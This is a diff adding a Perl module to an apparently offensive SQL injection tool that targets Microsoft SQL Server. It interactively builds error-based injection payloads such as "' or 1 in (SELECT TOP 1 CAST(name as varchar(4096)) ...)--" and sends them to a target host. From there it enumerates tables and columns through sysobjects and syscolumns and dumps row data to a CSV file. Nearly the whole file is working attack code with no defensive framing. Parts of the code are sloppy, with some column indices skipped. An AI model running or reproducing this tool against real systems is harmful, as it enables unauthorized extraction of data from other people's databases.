@@ -1,0 +1,356 @@
+############################
+# Automagically dump table structure and table values
+# 
+# using this method i worked out trying to get the origional 
+# table dumper working:
+#' or 1 in (SELECT TOP 1 'abc'+CAST(num as varchar(4096)) from testtable)--
+#
+
+
+############################
+# many of the options are commented out till later
+#
+############################
+use Switch;
+return 1;
+
+sub sysobjects_dumper2{
+
+startoftabledumper:	# Lable to go back to to start over, easier to read than a loop
+
+print "\n\nEnter the database to start from\n[master.dbo.sysobjects | sysobjects]:";
+
+$sysobjects=<STDIN>;chomp $sysobjects;
+
+if ($sysobjects =~ 'master'){$ismaster='master..';}; # set this prefix for master database
+
+
+print "Please select one of the following types to list:\n".
+	#"C \t CHECK constraint"
+	#."\n"."D \t Default or DEFAULT constraint"
+	#."\n"."F \t FOREIGN KEY constraint"
+	#."\n"."L \t Log"
+	#."\n"."P \t Stored procedure"
+	#."\n"."PK \t PRIMARY KEY constraint (type is K)"
+	#."\n"."RF \t Replication filter stored procedure"
+	#."\n"."S \t System table"
+	#."\n"."TR \t Trigger2"
+	"\n"."U \t User table"
+	#."\n"."UQ \t UNIQUE constraint (type is K)"
+	#."\n"."V \t View"
+	#."\n"."X \t Extended stored procedure"
+	#."\n"."C \t CHECK constraint"
+	#."\n"."D \t Default or DEFAULT constraint"
+	#."\n"."F \t FOREIGN KEY constraint"
+	#."\n"."L \t Log"
+	#."\n"."P \t Stored procedure"
+	#."\n"."PK \t PRIMARY KEY constraint (type is K)"
+	#."\n"."RF \t Replication filter stored procedure"
+	."\n"."S \t System table";
+	#."\n"."TR \t Trigger"
+	#."\n"."U \t User table"
+	#."\n"."UQ \t UNIQUE constraint (type is K)"
+	#."\n"."V \t View"
+	#."\n"."X \t Extended stored procedure\n\n";
+
+print "\n\nEnter selection:";
+
+	$type=<STDIN>; chomp $type;
+
+$object="!"; # Start WHERE search here
+
+############################
+# Extract sysobjects
+############################
+
+$index=1; # Start at first row and work down
+while(1){
+
+
+
+	$print_buffer="";
+	$t_query=
+
+	$qt ." or 1 in \(SELECT TOP 1 CAST(name as varchar(4096)) from ".$sysobjects." WHERE type='".$type."' AND name > '".$object."')--";	
+	
+
+#print $t_query;
+
+	sendsqlattack($t_host,$t_query,$req,$t_port);
+	chomp $err;
+	$print_buffer = "Object Name:$err" ."\n";
+$object=$err; # Set object
+	print $print_buffer;
+	$index++;
+if(length($err) ==0){ last;}
+}
+
+
+
+############################
+# Continue or start over
+############################
+
+
+
+print "\nWhat do you want to do, (C)ontinue and examine a table or (S)tart Over? :";
+$choose =<STDIN>;chomp $choose; $choose=uc($choose);
+#print "you chose $choose";
+
+switch ($choose) {
+
+		case 'S'	{goto startoftabledumper}		
+		case 'C'	{}
+}
+
+
+
+############################
+# Probe a table
+############################
+
+startofprober:
+
+print "\nPlease enter the table you want to examine:";
+$tablename=<STDIN>;chomp $tablename;
+
+$tablename2=$tablename; ### Something somewhere is setting
+			### $tablename, Prob in injector.include. Setting $tablename2
+			### to save time.
+	
+
+
+############################
+# Extract selected table
+############################
+
+$object="!"; # Start WHERE search here
+$index=1; # Start at first row and work down
+while(1){
+
+	$print_buffer="";
+	$t_query=	
+	$qt ." or 1 in \(SELECT TOP 1 CAST(name as varchar(4096)) from ".$ismaster.'syscolumns where id=object_id('."'".$ismaster.$tablename2."'".') AND name >'."'".$object."'".')--';
+
+#print $t_query;
+
+
+#' or 1 in (SELECT TOP 1 'abc'+CAST(num as varchar(4096)) from testtable)--
+#' INSERT into '.$dbtype.'automagictable2 select name,type from '.$ismaster. 'syscolumns where id=object_id('."'".$ismaster.$tablename."'".')--';
+	
+
+
+sendsqlattack($t_host,$t_query,$req,$t_port);
+	chomp $err;
+if(length($err) ==0){ last;}	# If reached the end exit sub
+	$print_buffer = "Column Name:$err" ."\n";
+
+$object=$err; # SET value to index by
+
+	print $print_buffer;
+	$index++;
+
+}
+
+############################
+# Continue or start over
+############################
+
+print "\nWhat do you want to do?\n(C)ontinue and dump rows, (D)ifferent table or (S)tart Over? :";
+$choose =<STDIN>;chomp $choose; $choose=uc($choose);
+#print "you chose $choose";
+
+switch ($choose) {
+
+		case 'S'	{goto startoftabledumper}		
+		case 'D'	{goto startofprober}
+		case 'C'	{}
+}
+
+
+
+##########################################################################
+# dump tables
+#
+# Note: this bit probabally needs totally recoding
+#	it would be better to create a new table with a identity field
+#	so that stuff can be indexed correctly
+#
+#	Seems to work ok tho.
+#
+
+
+
+print "\nEnter the columns you want dump separated with a \/\n\(up to 10 columns currently\):";
+	$user_cols=<STDIN>;chomp $user_cols;
+print "Please number of rows to return:";
+	$rows=<STDIN>;chomp $rows;
+
+(@cols)=split(/\//,$user_cols);
+
+
+
+
+#hold values in these
+@col1data="";
+@col2data="";
+@col3data="";
+@col4data="";
+@col5data="";
+@col6data="";
+@col7data="";
+@col8data="";
+@col9data="";
+@col10data="";
+
+
+
+
+############################
+# extract tabledata
+############################
+
+
+# Messy structure to hold data
+
+
+col_enumerator($tablename2); 	# enum
+display_table();		# display
+
+ 
+############################
+# Col enumerator sub
+############################
+
+
+ #Start indexing first col with this val
+
+sub col_enumerator{
+
+@coldata_tmp="";
+$object="!";
+
+@col_enumeratorvars=@_;
+	
+	$tblname=$col_enumeratorvars[0];
+	$colname=$col_enumeratorvars[1];
+	
+	for ($ce=1;$ce <= $rows; ++$ce){	# Loop thro number of rows
+
+############################
+# Get first Col and use to
+# index the rest
+############################
+
+	$t_query=
+
+		$qt ." or 1 in \(SELECT TOP 1 'AMAGIC'+CAST(".$cols[0]." as varchar(4096)) from ".$ismaster.$tblname." WHERE ".$cols[0]." > '".$object."')--";			
+			
+	sendsqlattack($t_host,$t_query,$req,$t_port);
+			($crap,$thevalue)=split(/AMAGIC/,$err);chomp $thevalue;
+			push(@col1data, $thevalue);	
+			$object=$thevalue;
+
+
+############################
+# The following could obviously
+# be cut down into a sub
+# was easier to cut and paste
+# to save time
+############################
+	
+
+
+############################
+# dump 10 columns using $object
+# to index (first col)
+############################
+
+$t_query=
+		$qt ." or 1 in \(SELECT TOP 1 'AMAGIC'+CAST(".$cols[1]." as varchar(4096)) from ".$ismaster.$tblname." WHERE ".$cols[0]." = '".$object."')--";		
+		#print $t_query;
+		sendsqlattack($t_host,$t_query,$req,$t_port);
+			($crap,$thevalue)=split(/AMAGIC/,$err);chomp $thevalue;
+			push(@col2data, $thevalue);	
+					
+
+$t_query=
+		$qt ." or 1 in \(SELECT TOP 1 'AMAGIC'+CAST(".$cols[2]." as varchar(4096)) from ".$ismaster.$tblname." WHERE ".$cols[0]." = '".$object."')--";		
+		#print $t_query;
+		sendsqlattack($t_host,$t_query,$req,$t_port);
+			($crap,$thevalue)=split(/AMAGIC/,$err);chomp $thevalue;
+			push(@col3data, $thevalue);	
+
+$t_query=
+		$qt ." or 1 in \(SELECT TOP 1 'AMAGIC'+CAST(".$cols[3]." as varchar(4096)) from ".$ismaster.$tblname." WHERE ".$cols[0]." = '".$object."')--";		
+		#print $t_query;
+		sendsqlattack($t_host,$t_query,$req,$t_port);
+			($crap,$thevalue)=split(/AMAGIC/,$err);chomp $thevalue;
+			push(@col4data, $thevalue);	
+
+$t_query=
+		$qt ." or 1 in \(SELECT TOP 1 'AMAGIC'+CAST(".$cols[4]." as varchar(4096)) from ".$ismaster.$tblname." WHERE ".$cols[0]." = '".$object."')--";		
+		#print $t_query;
+		sendsqlattack($t_host,$t_query,$req,$t_port);
+			($crap,$thevalue)=split(/AMAGIC/,$err);chomp $thevalue;
+			push(@col5data, $thevalue);	
+$t_query=
+		$qt ." or 1 in \(SELECT TOP 1 'AMAGIC'+CAST(".$cols[6]." as varchar(4096)) from ".$ismaster.$tblname." WHERE ".$cols[0]." = '".$object."')--";		
+		#print $t_query;
+		sendsqlattack($t_host,$t_query,$req,$t_port);
+			($crap,$thevalue)=split(/AMAGIC/,$err);chomp $thevalue;
+			push(@col6data, $thevalue);	
+$t_query=
+		$qt ." or 1 in \(SELECT TOP 1 'AMAGIC'+CAST(".$cols[7]." as varchar(4096)) from ".$ismaster.$tblname." WHERE ".$cols[0]." = '".$object."')--";		
+		#print $t_query;
+		sendsqlattack($t_host,$t_query,$req,$t_port);
+			($crap,$thevalue)=split(/AMAGIC/,$err);chomp $thevalue;
+			push(@col8data, $thevalue);	
+$t_query=
+		$qt ." or 1 in \(SELECT TOP 1 'AMAGIC'+CAST(".$cols[9]." as varchar(4096)) from ".$ismaster.$tblname." WHERE ".$cols[0]." = '".$object."')--";		
+		#print $t_query;
+		sendsqlattack($t_host,$t_query,$req,$t_port);
+			($crap,$thevalue)=split(/AMAGIC/,$err);chomp $thevalue;
+			push(@col10data, $thevalue);	
+ 
+	}	
+	
+
+
+} # end of for col_enumerator sub
+
+
+############################
+# Display to screen sub and write to a csv file
+############################
+
+sub display_table{
+
+print "To view correctly a .csv file needs to be created.\n\nPlease enter output file name:";
+$filename=<STDIN>;chomp $filename;
+
+
+
+@dtable=@_;
+$dnumber=$dtable[0];
+
+for($p=1; $p <=$rows;++$p){
+open(OUTFILE,">>$filename");
+print  $col1data[$p].','.$col2data[$p].','.$col3data[$p].','.$col4data[$p] 
+.','.$col5data[$p].','.$col6data[$p].','.$col7data[$p].','.$col8data[$p]
+.','.$col9data[$p].','.$col10data[$p] ."\n";		
+
+
+print OUTFILE $col1data[$p].','.$col2data[$p].','.$col3data[$p].','.$col4data[$p] 
+.','.$col5data[$p].','.$col6data[$p].','.$col7data[$p].','.$col8data[$p]
+.','.$col9data[$p].','.$col10data[$p]."\n";
+close OUTFILE;
+		}
+	} #end of display table
+
+} #end of sysobjects_dumper
+
+
+
+
+
